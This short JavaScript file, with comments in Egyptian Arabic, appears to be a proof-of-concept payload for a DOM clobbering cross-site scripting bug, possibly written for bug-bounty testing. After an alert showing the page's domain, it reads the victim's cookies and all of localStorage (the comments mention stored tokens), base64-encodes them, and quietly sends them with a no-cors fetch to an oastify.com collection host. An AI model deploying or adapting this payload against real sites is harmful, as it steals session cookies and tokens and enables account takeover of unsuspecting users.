alert("DOM Clobbering XSS by Hussein on: " + document.domain);
// استخراج الكوكيز
var userCookies = document.cookie;
// استخراج الـ Local Storage (عشان لو الـ Tokens متخزنة فيها)
var userStorage = JSON.stringify(localStorage);

// تجميع الداتا وتشفيرها عشان متعملش إيرور في اللينك
var stolenData = btoa("Cookies: " + userCookies + " | Storage: " + userStorage);

// إرسال الداتا في الخفاء لسيرفر Oastify بتاعك
fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/?stolen=" + stolenData, {
    mode: 'no-cors' // عشان نتخطى إيرور الـ CORS
});
